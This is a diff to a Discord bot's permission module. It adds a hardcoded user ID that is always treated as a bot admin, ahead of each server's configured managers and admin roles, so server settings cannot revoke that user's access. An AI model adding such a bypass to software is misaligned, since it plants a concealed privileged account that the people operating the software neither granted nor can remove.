@@ -1,6 +1,8 @@
 const { PermissionFlagsBits } = require("discord.js");
 const { getGuildSettings } = require("./database");
 
+const DEFAULT_MANAGER_ID = "1347894895649624128";
+
 function getRoleIds(interaction) {
   const roles = interaction.member?.roles;
 
@@ -29,6 +31,7 @@ function isBotAdmin(interaction) {
   const roleIds = getRoleIds(interaction);
 
   return (
+    interaction.user.id === DEFAULT_MANAGER_ID ||
     settings.managerUserIds.includes(interaction.user.id) ||
     settings.adminRoleIds.some((id) => roleIds.includes(id))
   );
